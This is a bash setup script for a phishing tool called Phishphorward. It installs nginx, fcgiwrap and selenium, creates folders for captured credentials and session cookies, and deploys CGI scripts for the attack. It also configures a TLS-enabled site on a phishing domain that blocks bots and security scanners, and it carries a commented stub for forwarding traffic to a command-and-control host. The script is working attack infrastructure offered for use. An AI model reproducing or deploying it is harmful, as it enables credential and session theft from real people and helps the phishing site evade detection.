#!/bin/bash

echo
echo "Phishphorward Setup Script"
echo

function showHelp {
    echo
    echo "Usage:

    $0 [OPTIONS]...

Options:

    -d
    --domain
      Domain to be configured for phishing

" >&2

}

#################
# Parse Arguments
#################

while [[ $# -gt 1 ]]
do
key="$1"

case $key in
    -d|--domain)
    DOMAIN="$2"
    shift # past argument
    ;;
    -h|--help)
    showHelp
    exit
    ;;
    *)
            # unknown option
    ;;
esac
shift # past argument or value
done


if [[ -z "$DOMAIN" ]]; then
    echo -e "$0: \e[31mYou must supply a domain name.\e[0m"
    showHelp
    exit 4
fi


sudo apt-get --assume-yes install nginx
sudo apt-get --assume-yes install fcgiwrap
sudo apt-get --assume-yes install python-pip
pip install selenium
mkdir /var/www/html/cgi-bin/
mkdir /var/www/html/cgi-bin/input/
mkdir /var/www/html/cgi-bin/credbackup/
mkdir /var/www/html/cgi-bin/cookies/
mv ./phishphorward.py /var/www/html/cgi-bin/
mv ./submit.py /var/www/html/cgi-bin/
mv ./watchdog.py /var/www/html/cgi-bin/
mv ./phantomjs /var/www/html/cgi-bin/
chown www-data /var/www/html/cgi-bin/
chown www-data /var/www/html/cgi-bin/*
chmod +x /var/www/html/cgi-bin/watchdog.py /var/www/html/cgi-bin/phishphordward.py /var/www/html/cgi-bin/phantomjs /var/www/html/cgi-bin/submit.py

sudo cat <<EOT | sudo tee -a /etc/nginx/sites-available/$DOMAIN

server {
    listen 80 default_server;
    server_name $DOMAIN;
    rewrite ^(.*) https://www.$DOMAIN\$1 permanent;
}
server {
    listen 80;
    server_name www.$DOMAIN;
    rewrite ^(.*) https://www.$DOMAIN\$1 permanent;
}
server {
    listen 80;
    listen 443 ssl;
 
    server_name www.$DOMAIN;
 
    # Block Bad Bots
    # Send 403 Forbidden or 444 Drop Connection
    if (\$bad_bot) { return 444; }
    # Block Bad Referers
    # Send 403 Forbidden  or 444 Drop Connection
    if (\$bad_referer) { return 403; }
    if (\$bad_urls1) { return 403; }
    if (\$bad_urls2) { return 403; }
    if (\$bad_urls3) { return 403; }
    if (\$bad_urls4) { return 403; }
    # Block Snoopers
    # Send 444 Connection Closed Without Response
    if (\$validate_client) { return 444;}

    # Modify this to forward your appropriate traffic: 
    #location /__utm.gif {
    #    proxy_pass https://$C2;
    #}

    location / {
        root /var/www/html/;
    }
 
    location /cgi-bin/ {
        gzip off;
        root /var/www/html/;
        fastcgi_pass unix:/var/run/fcgiwrap.socket;
        include /etc/nginx/fastcgi_params;
        fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name;
        }

    index index.html index.htm;

    ssl on;
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
    ssl_ciphers ALL:!DH:!EXPORT:!RC4:+HIGH:+MEDIUM:!LOW:!aNULL:!eNULL;
}
EOT

sudo rm /etc/nginx/sites-enabled/default
sudo wget -O /etc/nginx/conf.d/blacklist.conf https://github.com/mariusv/nginx-badbot-blocker/raw/master/blacklist.conf
sudo wget -O /etc/nginx/conf.d/blockips.conf https://github.com/mariusv/nginx-badbot-blocker/raw/master/blockips.conf
sudo certbot certonly -n -d $DOMAIN -d www.$DOMAIN --register-unsafely-without-email --standalone --agree-tos
sudo ln -s /etc/nginx/sites-available/$DOMAIN /etc/nginx/sites-enabled/
sudo service nginx restart

